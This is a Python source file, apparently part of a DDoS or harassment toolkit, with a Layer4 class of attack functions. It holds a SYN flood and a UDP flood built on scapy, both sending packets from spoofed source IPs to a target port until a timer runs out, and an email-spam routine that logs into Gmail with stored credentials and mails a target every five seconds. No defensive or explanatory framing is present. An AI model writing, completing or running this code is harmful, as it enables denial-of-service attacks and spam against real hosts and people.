from scapy.all import *
import time as timing
import utils
from globals import GMAIL_ACCOUNT_FILE
from emailsender import MailSender
from utils import spoof_ip, rand_int


class Layer4:
    @staticmethod
    def syn_flood(target: str, port: int, time: int):
        end_t = timing.time() + time
        IP_Packet = scapy.all.IP(dst=str(target), src=spoof_ip())
        TCP_Packet = scapy.all.TCP(sport=rand_int(), dport=int(
            port), flags="S", seq=rand_int(), window=rand_int())
        while (timing.time() < end_t):
            send(IP_Packet/TCP_Packet, verbose=0)

    @staticmethod
    def udp_flood(target: str, port: int, time: int):
        end_t = timing.time() + time
        IP_Packet = scapy.all.IP(dst=str(target), src=spoof_ip())
        UDP_Packet = scapy.all.UDP(sport=rand_int(), dport=int(port))
        payload = "A" * 450
        while (timing.time() < end_t):
            send(IP_Packet/UDP_Packet/payload, verbose=0)

    @staticmethod
    def email_spam(target: str, time: int, message: str):
        account, password = utils.get_gmail_account_from_file(
            GMAIL_ACCOUNT_FILE)
        mail_sender = MailSender(account, password)
        mail_sender.connect()
        end_t = timing.time() + time
        while (timing.time() < end_t):
            mail_sender.send_mail(target, message)
            timing.sleep(5)
        mail_sender.disconnect()
